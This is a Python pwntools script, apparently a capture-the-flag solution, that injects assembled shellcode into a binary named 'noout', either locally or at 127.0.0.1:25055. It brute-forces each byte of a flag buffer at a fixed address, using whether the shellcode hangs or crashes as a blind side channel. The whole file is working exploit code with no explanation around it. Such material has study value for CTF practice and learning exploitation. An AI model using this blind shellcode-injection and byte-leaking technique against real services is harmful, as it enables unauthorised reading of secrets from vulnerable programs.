# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-08-09 22:11:07

from pwn import *
import time

local=False

flag_buf = 0x6010C0

context.update(arch='amd64', os='linux')
context.timeout=3

def construct_sh(idx, char):
    sc =  'mov rax, {}\n'.format(flag_buf)
    sc += 'add rax, {}\n'.format(idx)
    sc += 'mov rax, [rax]\n'
    sc += 'cmp al, {}\n'.format(char)
    sc += 'je $\n'
    sc += 'xor rax, rax\n'
    sc += 'jmp rax\n'
    return sc

def getchar(idx):
    for char in range(0x20, 0x7f):
        time.sleep(0.05)
        if local:
            ps = process('../../../noout')
        else:
            ps = remote('127.0.0.1', 25055)
        ps.recv(1024)

        ps.sendline(asm(construct_sh(idx, char)))
        try:
            ps.recv(1024)
            ps.close()
        except EOFError:
            log.warn('Wrong char: \'' + chr(char) + '\'')
            ps.close()
            continue
        else:
            log.success('Found valid char: \'' + chr(char) + '\'')
            ps.close()
            return chr(char)
    return 0x0

def main():
    flag = ''

    for idx in range(0, 64):
        cur_char = getchar(idx)
        if cur_char == 0x0:
            break
        flag += cur_char
        log.info('Current idx: {}, current flag: {}'.format(idx, flag))

    log.success('Got flag: {}'.format(flag))

if __name__ == "__main__":
    main()
